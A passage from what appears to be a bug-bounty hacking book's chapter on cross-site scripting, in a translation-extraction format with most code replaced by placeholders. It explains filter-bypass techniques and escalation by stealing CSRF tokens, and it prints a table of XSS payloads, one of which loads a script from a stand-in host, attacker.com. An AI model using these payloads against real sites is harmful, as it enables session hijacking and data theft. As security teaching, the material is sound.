    input fields. A simple payload like this one is more likely to work on IoT or
    embedded applications that don’t use the latest frameworks. If you are interested
    in IoT vulnerabilities, check out OWASP’s IoTGoat project at [https://github.com/OWASP/IoTGoat/](https://github.com/OWASP/IoTGoat/).
    As XSS defenses become more advanced, the XSS payloads that get around these defenses
    grow more complex too.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
- en: More Than a <script> Tag
  id: totrans-118
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'Inserting `<script>` tags into victim web pages isn’t the only way to get your
    scripts executed in victim browsers. There are a few other tricks. First, you
    can change the values of attributes in HTML tags. Some HTML attributes allow you
    to specify a script to run if certain conditions are met. For example, the `onload`
    event attribute runs a specific script after the HTML element has loaded:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  id: totrans-120
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: Similarly, the `onclick` event attribute specifies the script to be executed
    when the element is clicked, and `onerror` specifies the script to run in case
    an error occurs loading the element. If you can insert code into these attributes,
    or even add a new event attribute into an HTML tag, you can create an XSS.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
- en: 'Another way you can achieve XSS is through special URL schemes, like `javascript:`
    and `data:`. The `javascript:` URL scheme allows you to execute JavaScript code
    specified in the URL. For example, entering this URL will cause an alert box with
    the text `XSS by Vickie` to appear:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'This means that if you make the user load a `javascript:` URL, you can achieve
    XSS as well. Data URLs, those that use the `data:` scheme, allow you to embed
    small files in a URL. You can use these to embed JavaScript code into URLs too:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  id: totrans-125
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'This URL will also generate an alert box*,* because the included data in the
    data URL is the base64-encoded version of the following script:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  id: totrans-127
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'Documents contained within `data:` URLs do not need to be base64 encoded. For
    example, you can embed the JavaScript directly in the URL as follows, but base64
    encoding can often help you bypass XSS filters:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'You can utilize these URLs to trigger XSS when a site allows URL input from
    users. A site might allow the user to load an image by using a URL and use it
    as their profile picture, like this:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'The application will then render a preview on the web page by inserting the
    URL into an `<img>` tag. If you insert a JavaScript or data URL, you can trick
    the victim’s browser into loading your JavaScript code:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  id: totrans-133
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: There are many more ways to execute JavaScript code to bypass XSS protection.
    You can find more example payloads on PortSwigger at [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/).
    Different browsers also support different tags and event handlers, so you should
    always test by using multiple browsers when hunting for XSS.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
- en: Closing Out HTML Tags
  id: totrans-135
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'When inserting an XSS payload, you’ll often have to close out a previous HTML
    tag by including its closing angle bracket. This is necessary when you’re placing
    your user input inside one HTML element but want to run JavaScript using a different
    HTML element. You have to complete the previous tag before you can start a new
    one to avoid causing a syntax error. Otherwise, the browser won’t interpret your
    payload correctly. For example, if you’re inserting input into an `<img>` tag,
    you need to close out the `<img>` tag before you can start a `<script>` tag. Here
    is the original `<img>` tag with a placeholder for user input:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'To close out the tag, your payload has to include the ending of an `<img>`
    tag before the JavaScript. The payload might look like this:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'When injected into the `<img>` tag, the resulting HTML will look like this
    (with the injected portion in bold):'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  id: totrans-141
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: This payload closes the string that was supposed to contain the user input by
    providing a double quote, then closes the `<img>` tag with a tag ending in `/>`.
    Finally, the payload injects a complete script tag after the `<img>` tag.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
- en: If your payload is not working, you can check whether your payload caused syntax
    errors in the returned document. You can inspect the returned document in your
    proxy and look for unclosed tags or other syntax issues. You can also open your
    browser’s console and see if the browser runs into any errors loading the page.
    In Firefox, you can open the console by right-clicking the page and choosing **Inspect
    Element**▶**Console**.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
- en: You can find more common XSS payloads online. [Table 6-1](#table6-1) lists some
    examples.
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
- en: 'Table 6-1: Common XSS Payloads'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
- en: '| **Payload** | **Purpose** |'
  id: totrans-146
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  id: totrans-147
  prefs: []
  type: TYPE_TB
- en: '| `<script>alert(1)</script>` | This is the most generic XSS payload. It will
    generate a pop-up box if the payload succeeds. |'
  id: totrans-148
  prefs: []
  type: TYPE_TB
- en: '| `<iframe src=javascript:alert(1)>` | This payload loads JavaScript code within
    an iframe. It’s useful when `<script>` tags are banned by the XSS filter. |'
  id: totrans-149
  prefs: []
  type: TYPE_TB
- en: '| `<body onload=alert(1)>` | This payload is useful when your input string
    can’t contain the term *script*. It inserts an HTML element that will run JavaScript
    automatically after it’s loaded. |'
  id: totrans-150
  prefs: []
  type: TYPE_TB
- en: '| `"><img src=x onerror=prompt(1);>` | This payload closes out the previous
    tag. It then injects an `<img>` tag with an invalid source URL. Once the tag fails
    to load, it will run the JavaScript specified in the `onerror` attribute. |'
  id: totrans-151
  prefs: []
  type: TYPE_TB
- en: '| `<script>alert(1)<!–` | `<!-` is the start of an HTML comment. This payload
    will comment out the rest of the line in the HTML document to prevent syntax errors.
    |'
  id: totrans-152
  prefs: []
  type: TYPE_TB
- en: '| `<a onmouseover"alert(1)">test</a>` | This payload inserts a link that will
    cause JavaScript to execute after a user hovers over the link with their cursor.
    |'
  id: totrans-153
  prefs: []
  type: TYPE_TB
- en: '| `<script src=//attacker.com/test.js>` | This payload causes the browser to
    load and run an external script hosted on the attacker’s server. |'
  id: totrans-154
  prefs: []
  type: TYPE_TB
- en: 'Hackers have designed many more creative payloads. Search *XSS payloads* online
    for more ideas. That said, taking a long list of payloads and trying them one
    by one can be time-consuming and unproductive. Another way of approaching manual
    XSS testing is to insert an *XSS polyglot*, a type of XSS payload that executes
    in multiple contexts. For example, it will execute regardless of whether it is
    inserted into an `<img>` tag, a `<script>` tag, or a generic `<p>` tag and can
    bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow
    at [https://polyglot.innerht.ml/](https://polyglot.innerht.ml/):'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  id: totrans-156
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: The details of this payload are beyond the scope of the book, but it contains
    multiple ways of creating an XSS—so if one method fails, another one can still
    induce the XSS.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
- en: 'Another way of testing for XSS more efficiently is to use generic test strings
    instead of XSS payloads. Insert a string of special HTML characters often used
    in XSS payloads, such as the following: `>''<"//:=;!--`. Take note of which ones
    the application escapes and which get rendered directly. Then you can construct
    test XSS payloads from the characters that you know the application isn’t properly
    sanitizing.'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
- en: 'Blind XSS flaws are harder to detect; since you can’t detect them by looking
    for reflected input, you can’t test for them by trying to generate an alert box.
    Instead, try making the victim’s browser generate a request to a server you own.
    For example, you can submit the following payload, which will make the victim’s
    browser request the page */xss* on your server:'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  id: totrans-160
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: Then, you can monitor your server logs to see if anyone requests that page.
    If you see a request to the path */xss*, a blind XSS has been triggered! Tools
    like XSS Hunter ([https://xsshunter.com/features](https://xsshunter.com/features))
    can automate this process. We’ll also talk more about setting up a server to test
    for multiple types of vulnerabilities in Chapter 13.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
- en: Finally, although hackers typically discover new XSS vectors manually, a good
    way to automatically test a site for already-known XSS vectors is through fuzzing.
    We’ll talk about fuzzing and automatic bug finding in Chapter 25.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 3: Confirm the Impact'
  id: totrans-163
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Check for your payload on the destination page. If you’re using an alert function,
    was a pop-up box generated on the page? If you’re using a `location` payload,
    did your browser redirect you offsite?
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
- en: Be aware that sites might also use user input to construct something other than
    the next returned web page. Your input could show up in future web pages, email,
    and file portals. A time delay also might occur between when the payload is submitted
    and when the user input is rendered. This situation is common in log files and
    analytics pages. If you’re targeting these, your payload might not execute until
    later, or in another user’s account. And certain XSS payloads will execute under
    only certain contexts, such as when an admin is logged in or when the user actively
    clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload
    by browsing to the necessary pages and performing those actions.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing XSS Protection
  id: totrans-166
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Most applications now implement some sort of XSS protection in their input fields.
    Often, they’ll use a blocklist to filter out dangerous expressions that might
    be indicative of XSS. Here are some strategies for bypassing this type of protection.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
- en: Alternative JavaScript Syntax
  id: totrans-168
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Often, applications will sanitize `<script>` tags in user input. If that is
    the case, try executing XSS that doesn’t use a `<script>` tag. For example, remember
    that in certain scenarios, you can specify JavaScript to run in other types of
    tags. When you try to construct an XSS payload, you can also try to insert code
    into HTML tag names or attributes instead. Say user input is passed into an HTML
    image tag, like this:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  id: totrans-170
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: Instead of closing out the image tag and inserting a script tag, like this
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  id: totrans-172
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: 'you can insert the JavaScript code directly as an attribute to the current
    tag:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE34]'
  id: totrans-174
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: 'Another way of injecting code without the `<script>` tag is to use the special
    URL schemes mentioned before. This snippet will create a Click me! link that will
    generate an alert box when clicked:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE35]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: Capitalization and Encoding
  id: totrans-177
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'You can also mix different encodings and capitalizations to confuse the XSS
    filter. For example, if the filter filters for only the string `"script"`, capitalize
    certain letters in your payload. Since browsers often parse HTML code permissively
    and will allow for minor syntax issues like capitalization, this won’t affect
    how the script tag is interpreted:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE36]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: 'If the application filters special HTML characters, like single and double
    quotes, you can’t write any strings into your XSS payload directly. But you could
    try using the JavaScript `fromCharCode()` function, which maps numeric codes to
    the corresponding ASCII characters, to create the string you need. For example,
    this piece of code is equivalent to the string `"http://attacker_server_ip/?c="`:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE37]'
  id: totrans-181
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: 'This means you can construct an XSS payload without quotes, like this:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE38]'
  id: totrans-183
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: 'The `String.fromCharCode()` function returns a string, given an input list
    of ASCII character codes. You can use this piece of code to translate your exploit
    string to an ASCII number sequence by using an online JavaScript editor, like
    *https://js.do/*, to run the JavaScript code or by saving it into an HTML file
    and loading it in your browser:'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE39]'
  id: totrans-185
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: 'The `ascii()` function 1 converts characters to their ASCII numeric representation.
    We run each character in the input string through `ascii()` 2. Finally, we write
    the translated string to the document 3. Let’s translate the payload `http://attacker_server_ip/?c=`
    by using this code:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE40]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: This JavaScript code should print out `"104, 116, 116, 112, 58, 47, 47, 97,
    116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112,
    47, 63, 99, 61"`. You can then use it to construct your payload by using the `fromCharCode()`
    method.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
- en: Filter Logic Errors
  id: totrans-189
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Finally, you could exploit any errors in the filter logic. For example, sometimes
    applications remove all `<script>` tags in the user input to prevent XSS, but
    do it only once. If that’s the case, you can use a payload like this:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE41]'
  id: totrans-191
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: 'Notice that each `<script>` tag cuts another `<script>` tag in two. The filter
    won’t recognize those broken tags as legitimate, but once the filter removes the
    intact tags from this payload, the rendered input becomes a perfectly valid piece
    of JavaScript code:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE42]'
  id: totrans-193
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: These are just a handful of the filter-bypass techniques that you can try. XSS
    protection is difficult to do right, and hackers are constantly coming up with
    new techniques to bypass protection. That’s why hackers are still constantly finding
    and exploiting XSS issues in the wild. For more filter-bypass ideas, check out
    OWASP’s XSS filter evasion cheat sheet ([https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)).
    You can also simply Google for *XSS filter bypass* for more interesting articles.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
- en: Escalating the Attack
  id: totrans-195
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The impact of XSS varies because of several factors. For instance, the type
    of XSS determines the number of users who could be affected. Stored XSS on a public
    forum can realistically attack anyone who visits that forum page, so stored XSS
    is considered the most severe. On the other hand, reflected or DOM XSS can affect
    only users who click the malicious link, and self-XSS requires a lot of user interaction
    and social engineering to execute, so they are normally considered lower impact.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
- en: The identities of the affected users matter too. Let’s say a stored XSS vulnerability
    is on a site’s server logs. The XSS can affect system administrators and allow
    attackers to take over their sessions. Since the affected users are accounts of
    high privilege, the XSS can compromise the integrity of the entire application.
    You might gain access to customer data, internal files, and API keys. You might
    even escalate the attack into RCE by uploading a shell or execute scripts as the
    admin.
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
- en: If, instead, the affected population is the general user base, XSS allows attackers
    to steal private data like cookies and session tokens. This can allow attackers
    to hijack any user’s session and take over the associated account.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
- en: Most of the time, XSS can be used to read sensitive information on the victim’s
    page. Since scripts executed during an XSS attack run as the target page, the
    script is able to access any information on that page. This means that you can
    use XSS to steal data and escalate your attack from there. This can be done by
    running a script that sends the data back to you. For example, this code snippet
    reads the CSRF token embedded on the victim’s page and sends it to the attacker’s
    server as a URL parameter named `token`. If you can steal a user’s CSRF tokens,
    you can execute actions on their behalf by using those tokens to bypass CSRF protection
    on the site. (See Chapter 9 for more on CSRF.)
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE43]'
  id: totrans-200
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: XSS can also be used to dynamically alter the page the victim sees, so you can
    replace the page with a fake login page and trick the user into giving you their
    credentials (often called *phishing*). XSS can also allow attackers to automatically
    redirect the victim to malicious pages and perform other harmful operations while
    posing as the legit site, such as installing malware. Before reporting the XSS
    you found, make sure to assess the full impact of that particular XSS to include
    in your vulnerability report.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
- en: Automating XSS Hunting
  id: totrans-202
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: XSS hunting can be time-consuming. You might spend hours inspecting different
    request parameters and never find any XSS. Fortunately, you can use tools to make
    your work more efficient.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
- en: First, you can use browser developer tools to look for syntax errors and troubleshoot
    your payloads. I also like to use my proxy’s search tool to search server responses
    for reflected input. Finally, if the program you are targeting allows automatic
    testing, you can use Burp intruder or other fuzzers to conduct an automatic XSS
    scan on your target. We will talk about this in Chapter 25.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
- en: Finding Your First XSS!
  id: totrans-205
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Jump right into hunting for your first XSS! Choose a target and follow the
    steps we covered in this chapter:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
- en: Look for user input opportunities on the application. When user input is stored
    and used to construct a web page later, test the input field for stored XSS. If
    user input in a URL gets reflected back on the resulting web page, test for reflected
    and DOM XSS.
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Insert XSS payloads into the user input fields you’ve found. Insert payloads
    from lists online, a polyglot payload, or a generic test string.
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Confirm the impact of the payload by checking whether your browser runs your
    JavaScript code. Or in the case of a blind XSS, see if you can make the victim
    browser generate a request to your server.
  id: totrans-209
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If you can’t get any payloads to execute, try bypassing XSS protections.
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Automate the XSS hunting process with techniques introduced in Chapter 25.
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Consider the impact of the XSS you’ve found: who does it target? How many users
    can it affect? And what can you achieve with it? Can you escalate the attack by
    using what you’ve found?'
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Send your first XSS report to a bug bounty program!
  id: totrans-213
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
